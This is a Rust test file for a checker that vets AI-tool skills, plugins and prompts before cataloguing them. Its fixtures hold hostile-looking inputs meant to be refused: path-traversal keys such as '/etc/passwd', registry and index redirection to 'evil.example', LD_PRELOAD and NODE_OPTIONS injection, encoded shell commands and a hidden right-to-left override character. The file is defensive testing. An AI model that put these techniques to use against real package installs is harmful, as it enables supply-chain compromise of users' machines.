//! `skills`, `plugins` and `prompts` sources (plan 3, Task 3).

use std::collections::BTreeMap;
use std::fs;
use std::path::{Path, PathBuf};

use sekisho_catalog::check::{CheckOptions, check_source, check_source_with};
use sekisho_catalog::launch::{Launch, parse_stdio};
use sekisho_catalog::model::{
    CheckedEntry, EntrySpec, PluginSpec, PromptSpec, SkillSpec, SourceCheck, sha256_hex,
};
use sekisho_catalog::names::{EntryKind, SourceKind};

fn fixture(path: &str) -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("tests/fixtures")
        .join(path)
}

fn names(check: &SourceCheck) -> Vec<&str> {
    let mut v: Vec<&str> = check.entries.iter().map(|e| e.name.as_str()).collect();
    v.sort();
    v
}

fn entry<'a>(check: &'a SourceCheck, name: &str) -> &'a CheckedEntry {
    check
        .entries
        .iter()
        .find(|e| e.name.as_str() == name)
        .unwrap_or_else(|| panic!("no entry {name}: {check:#?}"))
}

fn refusal<'a>(check: &'a SourceCheck, name: &str) -> &'a str {
    &check
        .refused
        .iter()
        .find(|r| r.name.as_deref() == Some(name))
        .unwrap_or_else(|| panic!("{name} not refused: {check:#?}"))
        .reason
}

fn paths(e: &CheckedEntry) -> Vec<&str> {
    e.files.iter().map(|f| f.path.as_str()).collect()
}

fn skill(e: &CheckedEntry) -> &SkillSpec {
    assert_eq!(e.kind, EntryKind::Skill);
    match &e.spec {
        EntrySpec::Skill(s) => s,
        other => panic!("{other:?}"),
    }
}

fn plugin(e: &CheckedEntry) -> &PluginSpec {
    assert_eq!(e.kind, EntryKind::Plugin);
    match &e.spec {
        EntrySpec::Plugin(p) => p,
        other => panic!("{other:?}"),
    }
}

fn prompt(e: &CheckedEntry) -> &PromptSpec {
    assert_eq!(e.kind, EntryKind::Prompt);
    match &e.spec {
        EntrySpec::Prompt(p) => p,
        other => panic!("{other:?}"),
    }
}

/// A source written into a temporary folder.
fn temp_source(files: &[(&str, &[u8])]) -> tempfile::TempDir {
    let dir = tempfile::tempdir().unwrap();
    for (path, body) in files {
        let path = dir.path().join(path);
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        fs::write(path, body).unwrap();
    }
    dir
}

fn check_temp(kind: SourceKind, files: &[(&str, &[u8])]) -> SourceCheck {
    let dir = temp_source(files);
    check_source(kind, dir.path()).unwrap()
}

fn skill_md(name: &str, description: &str) -> Vec<u8> {
    format!("---\nname: {name}\ndescription: {description}\n---\nBody.\n").into_bytes()
}

// ---------------------------------------------------------------- skills

#[test]
fn skills_are_folders_with_skill_md() {
    let c = check_source(SourceKind::Skills, &fixture("skills/basic")).unwrap();
    // pdf/inner/SKILL.md is one of pdf's files, not a skill of its own.
    assert_eq!(names(&c), ["pdf", "review"]);
    assert!(c.refused.is_empty(), "{:#?}", c.refused);

    let pdf = entry(&c, "pdf");
    assert_eq!(pdf.path, "pdf");
    assert_eq!(paths(pdf), ["SKILL.md", "inner/SKILL.md", "scripts/x.py"]);
    let spec = skill(pdf);
    assert_eq!(spec.description, "Read, fill and merge PDF files.");
    assert_eq!(spec.license.as_deref(), Some("Apache-2.0"));
    assert_eq!(
        spec.compatibility.as_deref(),
        Some("Needs Python 3.12 and pypdf.")
    );
    assert_eq!(skill(entry(&c, "review")).license, None);
}

#[cfg(unix)]
#[test]
fn a_skills_executable_bit_is_kept() {
    use std::os::unix::fs::PermissionsExt;
    let dir = temp_source(&[
        ("tool/SKILL.md", &skill_md("tool", "A tool.")),
        ("tool/run.sh", b"echo hi\n"),
    ]);
    let script = dir.path().join("tool/run.sh");
    fs::set_permissions(&script, fs::Permissions::from_mode(0o755)).unwrap();
    let c = check_source(SourceKind::Skills, dir.path()).unwrap();
    let files = &entry(&c, "tool").files;
    assert!(
        files
            .iter()
            .find(|f| f.path == "run.sh")
            .unwrap()
            .executable
    );
    assert!(
        !files
            .iter()
            .find(|f| f.path == "SKILL.md")
            .unwrap()
            .executable
    );
}

#[test]
fn skill_frontmatter_follows_obots_rules() {
    let long = "d".repeat(1025);
    let c = check_temp(
        SourceKind::Skills,
        &[
            (
                "mismatch/SKILL.md",
                &skill_md("other", "Named for another folder."),
            ),
            (
                "no-description/SKILL.md",
                b"---\nname: no-description\n---\n",
            ),
            ("too-long/SKILL.md", &skill_md("too-long", &long)),
            ("plain/SKILL.md", b"# No frontmatter\n"),
            (
                "unclosed/SKILL.md",
                b"---\nname: unclosed\ndescription: x\n",
            ),
            ("Bad_Name/SKILL.md", &skill_md("Bad_Name", "A bad name.")),
            (
                "compat/SKILL.md",
                format!(
                    "---\nname: compat\ndescription: x\ncompatibility: {}\n---\n",
                    "c".repeat(501)
                )
                .as_bytes(),
            ),
            ("ok/SKILL.md", &skill_md("ok", &"é".repeat(1024))),
        ],
    );
    assert_eq!(names(&c), ["ok"]);
    assert!(refusal(&c, "mismatch").contains("folder"));
    assert!(refusal(&c, "no-description").contains("description"));
    assert!(refusal(&c, "too-long").contains("1024"));
    assert!(refusal(&c, "plain").contains("frontmatter"));
    assert!(refusal(&c, "unclosed").contains("frontmatter"));
    assert!(refusal(&c, "Bad_Name").contains("name"));
    assert!(refusal(&c, "compat").contains("500"));
    assert!(c.refused.iter().all(|r| r.kind == Some(EntryKind::Skill)));

    // A skill at the source's root has no folder name to match, as in Obot.
    let root = check_temp(
        SourceKind::Skills,
        &[("SKILL.md", &skill_md("root", "At the root."))],
    );
    assert!(root.entries.is_empty());
    assert!(
        root.refused[0].reason.contains("folder of its own"),
        "{root:#?}"
    );

    // SKILL.md is at most 1 MiB.
    let mut big = skill_md("big", "Big.");
    big.resize((1 << 20) + 1, b'a');
    let c = check_temp(SourceKind::Skills, &[("big/SKILL.md", &big)]);
    assert!(refusal(&c, "big").contains("SKILL.md"));
}

// ---------------------------------------------------------------- plugins

#[test]
fn a_marketplace_lists_its_plugins() {
    let c = check_source(SourceKind::Plugins, &fixture("plugins/marketplace")).unwrap();
    assert_eq!(names(&c), ["formatter", "linter"]);
    assert!(c.refused.is_empty(), "{:#?}", c.refused);

    let formatter = entry(&c, "formatter");
    assert_eq!(formatter.path, "plugins/formatter");
    assert_eq!(
        paths(formatter),
        [".claude-plugin/plugin.json", "commands/fmt.md"]
    );
    let spec = plugin(formatter);
    // The plugin's own manifest wins over the marketplace's description.
    assert_eq!(spec.description, "Formats code.");
    assert_eq!(spec.version.as_deref(), Some("1.2.0"));
    assert!(spec.mcp_servers.is_empty());
    assert!(!spec.apm_checked);

    let linter = plugin(entry(&c, "linter"));
    let servers: BTreeMap<&str, &Launch> = linter
        .mcp_servers
        .iter()
        .map(|s| (s.name.as_str(), &s.launch))
        .collect();
    match servers["lint-server"] {
        Launch::Npx(p) => assert_eq!(p.to_string(), "@acme/lint-mcp@2.0.1"),
        other => panic!("{other:?}"),
    }
    match servers["docs"] {
        Launch::Remote { url } => assert_eq!(url, "https://mcp.example.com/docs"),
        other => panic!("{other:?}"),
    }
}

#[test]
fn plugins_without_a_marketplace_are_found_by_manifest() {
    let single = check_source(SourceKind::Plugins, &fixture("plugins/single")).unwrap();
    assert_eq!(names(&single), ["single"]);
    assert_eq!(entry(&single, "single").path, ".");

    let children = check_source(SourceKind::Plugins, &fixture("plugins/children")).unwrap();
    assert_eq!(names(&children), ["one", "two"]);
    assert!(children.refused.is_empty(), "{:#?}", children.refused);
}

fn marketplace(plugins: &str) -> Vec<u8> {
    format!(r#"{{"name": "m", "plugins": {plugins}}}"#).into_bytes()
}

#[test]
fn marketplace_sources_cannot_leave_the_repository() {
    let c = check_temp(
        SourceKind::Plugins,
        &[
            (
                ".claude-plugin/marketplace.json",
                &marketplace(
                    r#"[
                    {"name": "up", "source": "../outside"},
                    {"name": "deep-up", "source": "./a/../../outside"},
                    {"name": "abs", "source": "/etc"},
                    {"name": "slashes", "source": "a\\b"},
                    {"name": "remote", "source": {"source": "github", "repo": "o/r"}},
                    {"name": "by-url", "source": {"source": "url", "url": "https://git.example.com/p.git"}},
                    {"name": "missing", "source": "./nowhere"},
                    {"name": "ok", "source": "./ok"}
                ]"#,
                ),
            ),
            (
                "ok/plugin.json",
                br#"{"name": "ok", "description": "Fine."}"#,
            ),
        ],
    );
    assert_eq!(names(&c), ["ok"]);
    for escaping in ["up", "deep-up", "abs", "slashes"] {
        assert!(
            refusal(&c, escaping).contains("inside the repository"),
            "{escaping}"
        );
    }
    let remote = refusal(&c, "remote");
    assert!(
        remote.contains("o/r") && remote.contains("add it as a source"),
        "{remote}"
    );
    let by_url = refusal(&c, "by-url");
    assert!(by_url.contains("https://git.example.com/p.git"), "{by_url}");
    assert!(refusal(&c, "missing").contains("nowhere"));
}

#[test]
fn plugin_names_must_agree() {
    let c = check_temp(
        SourceKind::Plugins,
        &[
            (
                ".claude-plugin/marketplace.json",
                &marketplace(
                    r#"[{"name": "listed", "source": "./a"}, {"name": "Bad Name", "source": "./b"},
                        {"name": "inline", "source": "./c", "description": "Only in the marketplace."}]"#,
                ),
            ),
            ("a/plugin.json", br#"{"name": "other", "description": "x"}"#),
            (
                "b/plugin.json",
                br#"{"name": "Bad Name", "description": "x"}"#,
            ),
            ("c/commands/x.md", b"Do x.\n"),
        ],
    );
    assert!(refusal(&c, "listed").contains("other"));
    refusal(&c, "Bad Name");
    // A marketplace entry stands for a plugin without a manifest.
    assert_eq!(names(&c), ["inline"]);
    assert_eq!(
        plugin(entry(&c, "inline")).description,
        "Only in the marketplace."
    );
}

/// An APM plugin bundle with `bundle_files` hashing every file, as
/// `apm pack` writes it; `edit` changes the bundle after hashing.
fn apm_bundle(
    edit: impl FnOnce(&mut BTreeMap<String, Vec<u8>>, &mut BTreeMap<String, String>),
) -> tempfile::TempDir {
    let mut files: BTreeMap<String, Vec<u8>> = [
        (
            "plugin.json",
            &br#"{"name": "apm-tools", "description": "Packed by APM.", "version": "0.3.0"}"#[..],
        ),
        ("agents/reviewer.md", b"---\nname: reviewer\n---\nReview.\n"),
        (
            "skills/notes/SKILL.md",
            b"---\nname: notes\ndescription: Notes.\n---\n",
        ),
        ("commands/ship.md", b"Ship it.\n"),
        (
            "instructions/style.instructions.md",
            b"Use British English.\n",
        ),
        ("hooks/hooks.json", b"{\"hooks\": {}}\n"),
    ]
    .into_iter()
    .map(|(k, v)| (k.to_string(), v.to_vec()))
    .collect();
    let mut hashes: BTreeMap<String, String> = files
        .iter()
        .map(|(k, v)| (k.clone(), sha256_hex(v)))
        .collect();
    edit(&mut files, &mut hashes);
    let mut lock =
        String::from("lockfile_version: '1'\npack:\n  format: plugin\n  bundle_files:\n");
    for (k, v) in &hashes {
        lock.push_str(&format!("    {k:?}: {v}\n"));
    }
    files.insert("apm.lock.yaml".into(), lock.into_bytes());
    let dir = tempfile::tempdir().unwrap();
    for (path, bytes) in &files {
        let path = dir.path().join("apm-tools").join(path);
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        fs::write(path, bytes).unwrap();
    }
    dir
}

fn check_bundle(dir: &tempfile::TempDir) -> SourceCheck {
    check_source(SourceKind::Plugins, dir.path()).unwrap()
}

#[test]
fn apm_bundles_are_plugins() {
    let dir = apm_bundle(|_, _| {});
    let c = check_bundle(&dir);
    assert_eq!(names(&c), ["apm-tools"]);
    let e = entry(&c, "apm-tools");
    let spec = plugin(e);
    assert!(spec.apm_checked);
    assert_eq!(spec.version.as_deref(), Some("0.3.0"));
    assert!(paths(e).contains(&"instructions/style.instructions.md"));
    assert!(paths(e).contains(&"apm.lock.yaml"));

    // A plain lock file without bundle_files is an ordinary plugin.
    let dir = temp_source(&[
        ("p/plugin.json", br#"{"name": "p", "description": "x"}"#),
        (
            "p/apm.lock.yaml",
            b"lockfile_version: '1'\ndependencies: []\n",
        ),
    ]);
    let c = check_source(SourceKind::Plugins, dir.path()).unwrap();
    assert!(!plugin(entry(&c, "p")).apm_checked);
}

#[test]
fn apm_bundle_hashes_are_checked() {
    let changed = apm_bundle(|files, _| files.get_mut("commands/ship.md").unwrap().push(b'!'));
    assert!(refusal(&check_bundle(&changed), "apm-tools").contains("commands/ship.md"));

    let missing = apm_bundle(|files, _| {
        files.remove("agents/reviewer.md");
    });
    assert!(refusal(&check_bundle(&missing), "apm-tools").contains("agents/reviewer.md"));

    let extra = apm_bundle(|files, _| {
        files.insert("commands/extra.md".into(), b"Added later.\n".to_vec());
    });
    assert!(refusal(&check_bundle(&extra), "apm-tools").contains("commands/extra.md"));

    let prefixed = apm_bundle(|_, hashes| {
        for v in hashes.values_mut() {
            *v = format!("sha256:{}", v.to_uppercase());
        }
    });
    assert!(plugin(entry(&check_bundle(&prefixed), "apm-tools")).apm_checked);

    let other_algo = apm_bundle(|_, hashes| {
        let v = hashes.get_mut("commands/ship.md").unwrap();
        *v = format!("sha512:{v}");
    });
    assert!(refusal(&check_bundle(&other_algo), "apm-tools").contains("sha512"));

    // plugin.json and apm.lock.yaml may go unlisted, as in APM.
    let unlisted_manifest = apm_bundle(|_, hashes| {
        hashes.remove("plugin.json");
    });
    assert!(plugin(entry(&check_bundle(&unlisted_manifest), "apm-tools")).apm_checked);
}

#[test]
fn bundle_file_keys_cannot_leave_the_plugin() {
    for key in [
        "../x",
        "a/../../x",
        "/etc/passwd",
        "a/./b",
        "a//b",
        "a\\..\\b",
        "%2e%2e/x",
        "a/%252e%252e/b",
    ] {
        let dir = apm_bundle(|_, hashes| {
            hashes.insert(key.to_string(), "0".repeat(64));
        });
        let why = refusal(&check_bundle(&dir), "apm-tools").to_string();
        assert!(why.contains("unsafe"), "{key}: {why}");
    }
}

fn mcp_plugin(servers: &str) -> SourceCheck {
    check_temp(
        SourceKind::Plugins,
        &[
            ("p/plugin.json", br#"{"name": "p", "description": "x"}"#),
            (
                "p/.mcp.json",
                format!(r#"{{"mcpServers": {servers}}}"#).as_bytes(),
            ),
        ],
    )
}

#[test]
fn plugin_mcp_servers_need_exact_versions() {
    let ok = mcp_plugin(
        r#"{
        "a": {"command": "npx", "args": ["-y", "pkg@1.2.3"]},
        "b": {"command": "uvx", "args": ["--from", "pkg==1", "tool"]},
        "c": {"command": "docker", "args": ["run", "-i", "--rm", "-e", "K", "ghcr.io/o/i:1.0"]},
        "d": {"command": "node", "args": ["${CLAUDE_PLUGIN_ROOT}/server.js"]}
    }"#,
    );
    assert!(ok.refused.is_empty(), "{:#?}", ok.refused);
    let servers = &plugin(entry(&ok, "p")).mcp_servers;
    assert_eq!(servers.len(), 4);
    let image = servers.iter().find(|s| s.name == "c").unwrap();
    match &image.launch {
        // The tag is kept: the sync resolves it to a digest.
        Launch::Docker { image } => assert_eq!(image.tag(), Some("1.0")),
        other => panic!("{other:?}"),
    }
    assert!(matches!(
        &servers.iter().find(|s| s.name == "d").unwrap().launch,
        Launch::Other { command } if command == "node"
    ));

    for (servers, why) in [
        (
            r#"{"a": {"command": "npx", "args": ["pkg"]}}"#,
            "exact version",
        ),
        (
            r#"{"a": {"command": "uvx", "args": ["--with", "x", "pkg==1"]}}"#,
            "--with",
        ),
        (
            r#"{"a": {"command": "docker", "args": ["exec", "x"]}}"#,
            "docker run",
        ),
        (
            r#"{"a": {"command": "docker", "args": ["run", "--privileged", "x:1"]}}"#,
            "--privileged",
        ),
        (r#"{"a": {"url": "http://mcp.example.com/x"}}"#, "https"),
        (r#"{"a": {"type": "stdio"}}"#, "command or a url"),
    ] {
        let c = mcp_plugin(servers);
        let reason = refusal(&c, "p");
        assert!(reason.contains(why), "{servers}: {reason}");
    }
    // Plain http only where the check allows it (tests and the e2e build).
    let dir = temp_source(&[(
        "p/plugin.json",
        br#"{"name": "p", "description": "x", "mcpServers": {"a": {"url": "http://h/x"}}}"#,
    )]);
    let lax = check_source_with(
        SourceKind::Plugins,
        dir.path(),
        &CheckOptions {
            allow_plain_http: true,
        },
    )
    .unwrap();
    assert_eq!(names(&lax), ["p"]);
}

#[test]
fn manifest_mcp_servers_may_be_a_path_inside_the_plugin() {
    let c = check_temp(
        SourceKind::Plugins,
        &[
            (
                "p/plugin.json",
                br#"{"name": "p", "description": "x", "mcpServers": "./config/servers.json"}"#,
            ),
            (
                "p/config/servers.json",
                br#"{"mcpServers": {"s": {"command": "npx", "args": ["s@1.0.0"]}}}"#,
            ),
            (
                "q/plugin.json",
                br#"{"name": "q", "description": "x", "mcpServers": "../p/config/servers.json"}"#,
            ),
            (
                "r/plugin.json",
                br#"{"name": "r", "description": "x", "mcpServers": "./absent.json"}"#,
            ),
        ],
    );
    assert_eq!(names(&c), ["p"]);
    assert_eq!(plugin(entry(&c, "p")).mcp_servers[0].name, "s");
    assert!(refusal(&c, "q").contains("inside the plugin"));
    assert!(refusal(&c, "r").contains("absent.json"));
}

#[test]
fn stdio_launches_are_read_like_their_tools() {
    let args = |a: &[&str]| a.iter().map(|s| s.to_string()).collect::<Vec<_>>();
    let npx = |a: &[&str]| parse_stdio("npx", &args(a));
    assert!(matches!(
        npx(&["--yes", "-q", "pkg@1.0.0", "--x"]),
        Ok(Launch::Npx(_))
    ));
    match npx(&["-p", "@s/pkg@2.0.0", "bin-name"]).unwrap() {
        Launch::Npx(p) => assert_eq!(p.name(), "@s/pkg"),
        other => panic!("{other:?}"),
    }
    assert!(matches!(
        npx(&["--package=pkg@1.0.0", "bin"]),
        Ok(Launch::Npx(_))
    ));
    assert!(matches!(
        npx(&["--package", "pkg@1.0.0", "bin"]),
        Ok(Launch::Npx(_))
    ));
    for bad in [
        &["--registry", "https://evil.example", "pkg@1.0.0"][..],
        &["-p", "a@1.0.0", "-p", "b@1.0.0", "bin"],
        &["-y"],
        &["pkg@latest"],
    ] {
        assert!(npx(bad).is_err(), "{bad:?}");
    }

    let uvx = |a: &[&str]| parse_stdio("uvx", &args(a));
    assert!(matches!(
        uvx(&["mcp-server-fetch@0.6.2"]),
        Ok(Launch::Uvx(_))
    ));
    assert!(matches!(
        uvx(&["--from=pkg==1.0", "tool"]),
        Ok(Launch::Uvx(_))
    ));
    for bad in [
        &["--with", "x==1", "pkg==1"][..],
        &["--with=x==1", "pkg==1"],
        &["--index-url", "https://evil.example", "pkg==1"],
        &["pkg"],
    ] {
        assert!(uvx(bad).is_err(), "{bad:?}");
    }

    let docker = |a: &[&str]| parse_stdio("docker", &args(a));
    match docker(&[
        "run",
        "-it",
        "--rm",
        "--env=A=1",
        "-v",
        "/x:/y",
        "--name",
        "n",
        "nginx:1.27",
        "--port",
        "1",
    ])
    .unwrap()
    {
        Launch::Docker { image } => assert_eq!(image.repository(), "library/nginx"),
        other => panic!("{other:?}"),
    }
    for bad in [
        &["pull", "x"][..],
        &["run", "--cap-add", "SYS_ADMIN", "x"],
        &["run", "-i"],
        &["run", "Bad Image"],
    ] {
        assert!(docker(bad).is_err(), "{bad:?}");
    }

    assert!(matches!(
        parse_stdio("python", &args(&["-m", "server"])),
        Ok(Launch::Other { .. })
    ));
}

// ---------------------------------------------------------------- prompts

#[test]
fn prompts_are_markdown_files() {
    let c = check_source(SourceKind::Prompts, &fixture("prompts/basic")).unwrap();
    // README.md in any case, hidden folders and other files are skipped.
    assert_eq!(names(&c), ["release-notes", "standup"]);
    assert!(c.refused.is_empty(), "{:#?}", c.refused);
    let notes = entry(&c, "release-notes");
    assert_eq!(notes.path, "release-notes.md");
    assert_eq!(paths(notes), ["release-notes.md"]);
    assert_eq!(
        prompt(notes).description,
        "Draft release notes from merged pull requests."
    );
    let standup = entry(&c, "standup");
    assert_eq!(standup.path, "nested/standup.md");
    assert_eq!(paths(standup), ["standup.md"]);
    assert_eq!(prompt(standup).description, "");

    let bad = check_temp(
        SourceKind::Prompts,
        &[
            ("Bad Name.md", b"x\n"),
            ("a/dup.md", b"1\n"),
            ("b/dup.md", b"2\n"),
        ],
    );
    assert!(bad.entries.is_empty(), "{bad:#?}");
    refusal(&bad, "Bad Name");
    assert_eq!(
        bad.refused
            .iter()
            .filter(|r| r.name.as_deref() == Some("dup"))
            .count(),
        2
    );
}

// ---------------------------------------------------------------- every kind

#[test]
fn hidden_characters_refuse_or_warn() {
    let c = check_temp(
        SourceKind::Skills,
        &[
            ("tricky/SKILL.md", &skill_md("tricky", "Looks fine.")),
            (
                "tricky/scripts/run.py",
                "print('ok')\nx = 1 # \u{202E}\n".as_bytes(),
            ),
        ],
    );
    let why = refusal(&c, "tricky");
    assert!(
        why.contains("scripts/run.py") && why.contains("U+202E"),
        "{why}"
    );

    let c = check_temp(
        SourceKind::Prompts,
        &[("note.md", "one\ntw\u{200B}o\n".as_bytes())],
    );
    assert_eq!(names(&c), ["note"]);
    let w = &c.warnings[0];
    assert_eq!(w.path, "note.md");
    assert!(
        w.message.contains("line 2, column 3") && w.message.contains("U+200B"),
        "{w:?}"
    );

    // Binary files aren't text, so they aren't scanned.
    let c = check_temp(
        SourceKind::Skills,
        &[
            ("bin/SKILL.md", &skill_md("bin", "Ships a binary.")),
            ("bin/blob", &[0xff, 0xfe, 0x2e, 0x20]),
        ],
    );
    assert_eq!(names(&c), ["bin"]);
}

#[test]
fn limits_refuse_an_entry() {
    let dir = temp_source(&[("big/SKILL.md", &skill_md("big", "Has a big file."))]);
    let file = fs::File::create(dir.path().join("big/data.bin")).unwrap();
    file.set_len((10 << 20) + 1).unwrap();
    let c = check_source(SourceKind::Skills, dir.path()).unwrap();
    assert!(refusal(&c, "big").contains("data.bin"));

    let dir = temp_source(&[("many/SKILL.md", &skill_md("many", "Has many files."))]);
    for i in 0..5_000 {
        fs::write(dir.path().join(format!("many/f{i}")), b"").unwrap();
    }
    let c = check_source(SourceKind::Skills, dir.path()).unwrap();
    assert!(refusal(&c, "many").contains("5000"));
}

#[test]
fn plugin_servers_cannot_steer_package_managers() {
    let ok = mcp_plugin(
        r#"{"a": {"command": "npx", "args": ["-y", "pkg@1.2.3"], "env": {"LOG_LEVEL": "debug"}}}"#,
    );
    assert!(ok.refused.is_empty(), "{:#?}", ok.refused);
    for key in [
        "NPM_CONFIG_REGISTRY",
        "npm_config_registry",
        "UV_INDEX_URL",
        "UV_DEFAULT_INDEX",
        "PIP_INDEX_URL",
        "NODE_OPTIONS",
        "PYTHONPATH",
        "LD_PRELOAD",
        "DYLD_INSERT_LIBRARIES",
        "YARN_NPM_REGISTRY_SERVER",
    ] {
        let c = mcp_plugin(&format!(
            r#"{{"a": {{"command": "npx", "args": ["-y", "pkg@1.2.3"], "env": {{"{key}": "https://evil.example"}}}}}}"#
        ));
        assert!(c.entries.is_empty(), "{key}: {:#?}", c.entries);
        let why = &c.refused[0].reason;
        assert!(why.contains(key), "{key}: {why}");
    }
    let c = mcp_plugin(r#"{"a": {"command": "npx", "args": ["-y", "pkg@1.2.3"], "env": ["x"]}}"#);
    assert!(c.entries.is_empty(), "env must be an object");
}

#[test]
fn launchers_are_known_by_their_file_name() {
    for command in ["/usr/bin/npx", "npx.cmd", "C:\\\\node\\\\npx.exe", "NPX"] {
        let c = mcp_plugin(&format!(
            r#"{{"a": {{"command": "{command}", "args": ["pkg"]}}}}"#
        ));
        assert!(c.entries.is_empty(), "{command}: {:#?}", c.entries);
        assert!(
            c.refused[0].reason.contains("exact version"),
            "{command}: {}",
            c.refused[0].reason
        );
    }
    let c = mcp_plugin(r#"{"a": {"command": "/usr/local/bin/uvx", "args": ["pkg"]}}"#);
    assert!(c.entries.is_empty());
    // Run as docker, `run` with no image is refused; as another program it
    // would pass.
    let c = mcp_plugin(r#"{"a": {"command": "docker.exe", "args": ["run"]}}"#);
    assert!(c.entries.is_empty(), "{:#?}", c.entries);
}

/// One server's launch, as a JSON server definition.
fn launch(command: &str, args: &[&str]) -> SourceCheck {
    let args: Vec<String> = args.iter().map(|a| format!("{a:?}")).collect();
    mcp_plugin(&format!(
        r#"{{"a": {{"command": {command:?}, "args": [{}]}}}}"#,
        args.join(", ")
    ))
}

#[test]
fn other_package_runners_need_exact_versions() {
    for (command, args, runner) in [
        ("bunx", vec!["pkg@1.2.3"], "bunx"),
        ("bunx", vec!["--bun", "-p", "pkg@1.2.3", "tool"], "bunx"),
        ("pnpm", vec!["dlx", "pkg@1.2.3"], "pnpm dlx"),
        ("yarn", vec!["dlx", "-q", "pkg@1.2.3"], "yarn dlx"),
        (
            "npm",
            vec!["exec", "--yes", "--", "pkg@1.2.3", "--flag"],
            "npm exec",
        ),
        ("npm", vec!["x", "pkg@1.2.3"], "npm exec"),
    ] {
        let c = launch(command, &args);
        assert!(c.refused.is_empty(), "{command} {args:?}: {:#?}", c.refused);
        match &plugin(entry(&c, "p")).mcp_servers[0].launch {
            Launch::NpmRunner { runner: r, package } => {
                assert_eq!(
                    (r.as_str(), package.to_string().as_str()),
                    (runner, "pkg@1.2.3")
                );
            }
            other => panic!("{command} {args:?}: {other:?}"),
        }
    }
    for (command, args, runner) in [
        ("uv", vec!["tool", "run", "tool==1.0"], "uv tool run"),
        (
            "uv",
            vec!["tool", "run", "--from", "pkg==2.0", "tool"],
            "uv tool run",
        ),
        ("pipx", vec!["run", "tool==1.0"], "pipx run"),
        (
            "pipx",
            vec!["run", "--spec", "pkg==2.0", "tool"],
            "pipx run",
        ),
    ] {
        let c = launch(command, &args);
        assert!(c.refused.is_empty(), "{command} {args:?}: {:#?}", c.refused);
        match &plugin(entry(&c, "p")).mcp_servers[0].launch {
            Launch::PythonRunner { runner: r, .. } => assert_eq!(r, runner),
            other => panic!("{command} {args:?}: {other:?}"),
        }
    }
    for (command, args, why) in [
        ("bunx", vec!["pkg"], "exact version"),
        ("pnpm", vec!["dlx", "pkg@latest"], "exact version"),
        ("pnpm", vec!["dlx", "-c", "pkg@1.2.3 run"], "-c"),
        ("yarn", vec!["dlx", "pkg"], "exact version"),
        ("npm", vec!["exec", "pkg"], "exact version"),
        (
            "npm",
            vec!["exec", "--registry", "https://evil.example", "pkg@1.2.3"],
            "--registry",
        ),
        ("npm", vec!["exec", "-c", "pkg@1.2.3"], "-c"),
        ("uv", vec!["tool", "run", "tool"], "exact version"),
        (
            "uv",
            vec![
                "tool",
                "run",
                "--index-url",
                "https://evil.example",
                "tool==1.0",
            ],
            "--index-url",
        ),
        ("pipx", vec!["run", "tool"], "exact version"),
        (
            "pipx",
            vec![
                "run",
                "--pip-args=--index-url=https://evil.example",
                "tool==1.0",
            ],
            "--pip-args",
        ),
    ] {
        let c = launch(command, &args);
        assert!(c.entries.is_empty(), "{command} {args:?} was accepted");
        let reason = &c.refused[0].reason;
        assert!(reason.contains(why), "{command} {args:?}: {reason}");
    }
}

#[test]
fn shell_command_lines_are_refused() {
    for (command, args) in [
        ("sh", vec!["-c", "npx -y pkg@latest"]),
        ("/bin/bash", vec!["-lc", "npx pkg"]),
        ("zsh", vec!["-c", "x"]),
        ("cmd", vec!["/c", "npx pkg"]),
        ("cmd.exe", vec!["/C", "npx pkg"]),
        ("powershell", vec!["-Command", "npx pkg"]),
        ("pwsh", vec!["-c", "npx pkg"]),
        ("pwsh.exe", vec!["-EncodedCommand", "AAAA"]),
    ] {
        let c = launch(command, &args);
        assert!(c.entries.is_empty(), "{command} {args:?} was accepted");
        assert!(
            c.refused[0].reason.contains("shell"),
            "{command} {args:?}: {}",
            c.refused[0].reason
        );
    }
    // A script among the plugin's own files runs unchecked, as `node` does.
    for (command, args) in [
        ("bash", vec!["${CLAUDE_PLUGIN_ROOT}/run.sh"]),
        ("bash", vec!["-e", "${CLAUDE_PLUGIN_ROOT}/run.sh"]),
        ("pwsh", vec!["-File", "${CLAUDE_PLUGIN_ROOT}/run.ps1"]),
        ("pnpm", vec!["start"]),
    ] {
        let c = launch(command, &args);
        assert!(c.refused.is_empty(), "{command} {args:?}: {:#?}", c.refused);
    }
}
